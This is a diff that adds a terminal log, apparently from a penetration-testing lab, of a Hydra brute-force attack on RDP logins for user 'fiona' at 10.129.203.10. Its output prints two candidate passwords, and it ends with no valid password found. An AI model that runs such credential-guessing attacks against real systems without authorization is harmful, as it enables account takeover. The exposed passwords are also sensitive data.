@@ -1,0 +1,21 @@
+### [2026-04-22 21:42:03] hydra -l fiona -P server3_passwords.txt rdp://10.129.203.10 -t 4
+
+$ hydra -l fiona -P server3_passwords.txt rdp://10.129.203.10 -t 4
+
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-22 21:42:03
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:1/p:15), ~4 tries per task
+[DATA] attacking rdp://10.129.203.10:3389/
+[3389][rdp] account on 10.129.203.10 might be valid but account not active for remote desktop: login: fiona password: 48Ns72!bns74@S84NNNSl, continuing attacking the account.
+[ERROR] freerdp: The connection failed to establish.
+[3389][rdp] account on 10.129.203.10 might be valid but account not active for remote desktop: login: fiona password: (DK02ka-dsaldS, continuing attacking the account.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-22 21:42:16
+
+# Exit code: 0
+# Duration: 2026-04-22 21:42:16
